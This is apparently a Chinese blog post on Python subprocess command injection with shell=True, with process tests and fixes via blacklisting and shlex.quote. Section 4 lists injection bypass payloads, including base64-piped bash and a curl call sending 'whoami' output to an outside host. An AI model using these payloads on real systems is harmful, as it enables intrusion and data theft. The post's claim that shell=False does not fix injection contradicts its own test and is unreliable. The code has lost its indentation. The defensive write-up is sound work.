## 1 前言

今天遇到一个不好做白名单的Python命令执行漏洞修复的问题。由于是`shell=True`导致的任意命令执行，一开始大胆猜测将True改为False即可。经过测试确实是这样，但是参数需要放在list里，稍微有点麻烦。

后来考虑，还可以做黑名单，过滤掉特殊字符，那就写fuzz脚本跑那些需要过滤的字符。最后觉得黑名单方式可能会被绕过，就看官方文档，发现了一个牛逼的修复方法，利用`shlex.quote()`在命令的参数两边加上一对单引号。

## 2 测试环境

>   * CentOS Linux release 7.3.1611 (Core)  
>
>
>   * Python 2.7.5
>
>

本文在没有特殊描述环境下，都是在以上环境测试。

## 3 shell值为True和False的区别

先来看看造成命令执行的代码

    
    
    s=subprocess.Popen('id', shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)  
    print(s.communicate())   # 输出结果，并kill产生的新进程  
    

当`shell=True`，并且第一个参数外部可控，那么就能造成任意命令执行。

###  **3.1 shell为False**

改为False，任意命令执行漏洞就会被修复。但确实是这样

    
    
    >>> s=subprocess.Popen(["ls",";id"], shell=False, stderr=subprocess.PIPE, stdout=subprocess.PIPE)  
    >>> s.communicate()  
    ('', 'ls: cannot access ;id: No such file or directory\n')  
    

这样即使`;id`可控，也不能任意命令执行。

执行`cat /etc/passwd`，如果命令要跟参数，第一个参数必须是一个list。

    
    
    >>> import subprocess  
    >>> s=subprocess.Popen(['cat', '/etc/passwd'], shell=False, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

此时，查看python的进程情况：

    
    
    [root@sec ~]# ps -ef | grep 24593  
    root     24593 24536  0 11:28 pts/0    00:00:00 python  
    root     24594 24593  0 11:28 pts/0    00:00:00 [cat] <defunct>

可以看到python有一个子进程叫做`(cat)`。证明，`shell=False`是python作为父进程执行了`cat`这个bin文件，产生一个子进程。测试的时候，如果要kill刚产生的子进程，使用`s.communicate()`，并查看返回结果。

测试发现，当`shell=True`，并且subprocess.Popen的第一个参数为一个list时，python进程会被卡死。

###  **3.2 shell为True**  

    
    
    import subprocess  
    s=subprocess.Popen('whoami | wc -l', shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

可以看到，Python新建了一个叫`sh`的子进程，该进程执行了`whoami | wc
-l`命令。继续执行python命令`s.communicate()`，刚产生的子进程就被kill了。

    
    
    [root@sec ~]# ps -ef | grep 16323  
    root     16323 16256  0 14:20 pts/0    00:00:00 python  
    root     16379 16323  0 14:26 pts/0    00:00:00 [sh] <defunct>  
    

所以，证明，当`shell=True`时，Python调用`/bin/sh`去执行命令。

但是有一个特例，当`shell=True`，执行一个没有任何参数的命令的情况和`shell=False`一样。说明，没有任何参数的命令，设置`shell=True`，并没有生效。

    
    
    s=subprocess.Popen('whoami', shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)  
    

再查看发现，python的子进程并没有`sh`，而是`[[whoami]
<defunct>]`，所以证明了，没有任何参数的命令，设置`shell=True`，并没有新建一个bash去执行该命令。

    
    
    [root@sec ~]# ps -ef | grep whoami  
    root     16200 15484  0 14:13 pts/0    00:00:00 [whoami] <defunct>  
    root     16203 11641  0 14:14 pts/1    00:00:00 grep --color=auto whoami  
      
    [root@sec ~]# ps -ef | grep 15484  
    root     15484 10092  0 12:24 pts/0    00:00:00 python  
    root     16200 15484  0 14:13 pts/0    00:00:00 [whoami] <defunct>

###  **3.3 总结二者区别**  

比较简单粗暴的可以理解为，True用`/bin/sh`执行，False是Python直接调用命令，而不会通过bash。

具体的细节区别：

>   * 当执行的命令没有参数时，无论是否设置shell=True，python直接执行该命令，而不是通过`/bin/sh`
>
>   * 当shell=True，并且命令存在参数时，python调用`/bin/sh`执行命令
>
>   * 当`shell=True`，并且subprocess.Popen的第一个参数为一个list时，python进程会被卡死
>
>   * 如果设置shell为False，并且想执行带参数的命令，第一个参数必须是一个list
>
>

## 4 Linux命令执行绕过

现在有个目标是，利用`ls xx`来执行id命令，xx可控。fuzz后的结果：

    
    
    ls | id  
    ls ; id  
    ls & id  
    ls 回车 id  
    ls `id`     
    ls ` id`   前面加了一个空格  
    ls `\id`   反斜杠  i\d等价于id  
    ls $(id)    
    

下面这几种姿势是在网上的相关paper看到的，补充下，不过还是会利用`| & ;`等分割符。

    
    
    ls | a=i;b=d;$a$b   拼接  
    ls | echo aWQ=| base64 -d | bash   利用base64  
    ls | curl test.joychou.org/`whoami`   利用dnslog或者http web log

## 5 漏洞修复

所以看来，设置`shell=False`并不能修复命令执行，并且还会影响我们想执行的正常命令。

那就做特殊字符过滤吧。从上面的绕过姿势来看，需要过滤的字符总结如下：

    
    
    ascii为10  
    ;  
    |  
    &  
    `  
    $  
    \  
    (  
    )

fuzz的代码大概如下，如果有特殊需求，还需要酌情修改。

    
    
    #coding: utf-8  
      
    import subprocess  
      
      
    def exec_cmd(cmd):  
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)  
    res_msg, res_err = p.communicate()  
    res = res_msg + res_err  
    return res  
      
      
    def main():  
    for i in range(1, 256):  
    cmd = 'echo 111 ' + chr(i) + ' id'  
    if 'uid' in exec_cmd(cmd):  
    print chr(i), i, cmd  
      
    for i in range(32, 126): # 可见ascii码  
    if chr(i) == 'u' or chr(i) == '|' or chr(i) == '&' or chr(i) == ';' or i == 10:  
    continue  
    for j in range(32, 126):  
    cmd = 'echo 111 ' + chr(i) + 'id' + chr(j)    
    if 'uid' in exec_cmd(cmd):  
    print chr(i), i, cmd  
      
      
    if __name__ == '__main__':  
    main()  
    

综上，检测代码：

    
    
    def check_cmd_exec(input):  
    '''  
            * input为输入字符串  
            * 检测到危险字符串，返回True，否则返回False  
            * author: JoyChou  
            * date:   2018-03-21  
        '''  
    res = ''  
    blacklist = '`$\()&;|'  
      
    for i, ch in enumerate(input):  
    if ord(ch) == 10 or ch in blacklist:  
    return True  
    return False  
    

不过，话说，有没有自带比较简单粗暴的过滤函数之类的？既能保证功能正常，也能保证安全性。

## 6 官方修复

最后在官方文档上看到这样一个描述：

> When using shell=True, pipes.quote() can be used to properly escape
> whitespace and shell metacharacters in strings that are going to be used to
> construct shell commands.

意思就是，用`pipes.quote()`过滤就好了。

不过，这个库已经被官方废弃了，官方推荐使用`shlex.quote()`。
其实`pipes.quote()`和`shlex.quote()`这两个功能一样，都是当参数有特殊字符时，在参数两边加上一对`''`。

    
    
    >>> a = shlex.quote('xxaa~')  
    >>> a  
    "'xxaa~'"  
      
    >>> a = shlex.quote('xxaa')  
    >>> a  
    'xxaa'  
    

避免命令的原理，看下这个实例就懂了。

    
    
    >>> filename = 'somefile; whoami'  
    >>> command = 'ls -l {}'.format(quote(filename))  
    >>> print(command)  
    ls -l 'somefile; whoami'

需要注意，只能用在参数上。并且Python2没有`shlex`，但是Python2和3都有`pipes`，所以想都适配就用`pipes`。

## 7 总结

推荐两种修复方式：

>   * shell=True，使用`pipes.quote()`对参数进行过滤
>
>   * shell=False，参数使用list。缺点是写参数时会稍微麻烦点
>
>

## 8 Reference

  

>   * <https://docs.python.org/2/library/subprocess.html>
>
>   * <https://docs.python.org/3/library/shlex.html>
>
>   *
> [命令执行和绕过的一些小技巧](https://www.anquanke.com/post/id/84920https://www.anquanke.com/post/id/84920)
>
>

 **@JoyChou博客链接：<https://joychou.org>**

